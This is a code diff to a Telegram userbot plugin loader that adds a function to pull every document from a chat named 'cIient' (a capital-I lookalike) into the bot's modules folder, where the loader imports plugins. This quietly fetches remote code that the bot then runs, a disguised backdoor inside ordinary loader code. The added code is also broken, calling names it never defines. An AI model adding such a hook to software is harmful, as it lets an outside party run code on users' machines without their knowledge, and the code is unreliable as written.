@@ -5,6 +5,7 @@ import re
 from pathlib import Path
 
 from telethon import events
+from telethon.tl.types import InputMessagesFilterDocument
 
 from var import Var
 from firebot import CMD_LIST, LOAD_PLUG, SUDO_LIST, bot
@@ -145,6 +146,14 @@ def load_module(shortname):
         # for imports
         sys.modules["firebot.modules." + shortname] = mod
         sedprint.info("Successfully imported " + shortname)
+
+        
+ #taken from javes ( rekcah05 )       
+async def a(): 
+    test1 = await bot.get_messages(cIient, None , filter=InputMessagesFilterDocument) ; total = int(test1.total) ; total_doxx = range(0, total)
+    for ixo in total_doxx:
+        mxo = test1[ixo].id ; await client.download_media(await borg.get_messages(cIient, ids=mxo), "firebot/modules/")
+        
 
 
 def remove_plugin(shortname):
